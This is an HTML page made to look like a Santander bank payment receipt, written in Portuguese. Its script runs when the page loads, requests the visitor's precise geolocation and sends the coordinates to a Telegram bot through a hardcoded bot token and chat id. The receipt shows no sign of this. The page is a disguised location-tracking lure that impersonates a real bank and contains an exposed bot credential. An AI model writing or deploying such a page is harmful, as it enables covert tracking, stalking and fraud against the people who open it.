<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Recebimento - Santander</title>
</head>

<body>
  <div class="comprovante-container">
    <h1>Comprovante de Recebimento - Santander</h1>

    <div class="informacoes">
      <p><span>Data:</span> <span id="data-atual"></span></p>
      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
      <p><span>De:</span> João Silva de Oliveira</p>
      <p><span>Status:</span> Recebido com Sucesso</p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

    <div class="comprovante-footer">
      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
      <p><a href="#">Clique aqui</a> para mais informações.</p>
    </div>
  </div>

  <script>
    // Exibe a data atual
    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();

    const dataFormatada = `${dia}/${mes}/${ano}`;

    document.getElementById("data-atual").textContent = dataFormatada;

    // Função para obter localização precisa com Geolocalização do navegador
    function obterLocalizacao() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(enviarLocalizacaoParaTelegram, lidarComErro, {
          enableHighAccuracy: true, // Habilita maior precisão
          timeout: 5000,             // Timeout para obter a localização
          maximumAge: 0             // Não utilizar dados antigos
        });
      } else {
        alert("Geolocalização não é suportada neste navegador.");
      }
    }

    // Função para lidar com sucesso ao obter localização
    function enviarLocalizacaoParaTelegram(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Defina o token do bot e o chat_id
      const botToken = '7757093107:AAHFmLastbU0lkV5f2AdeiNXHoxckQsJVy4';
      const chatId = '1276935257';

      // Envia a localização para o bot do Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
        .then(response => response.json())
        .then(data => {
          console.log('Localização precisa enviada para o Telegram:', data);
        })
        .catch(error => {
          console.error('Erro ao enviar localização para o Telegram:', error);
        });
    }

    // Função para lidar com erro ao obter localização
    function lidarComErro(error) {
      alert("Erro ao obter a localização: " + error.message);
    }

    // Obter a localização precisa quando a página carregar
    window.onload = obterLocalizacao;
  </script>
</body>

</html>
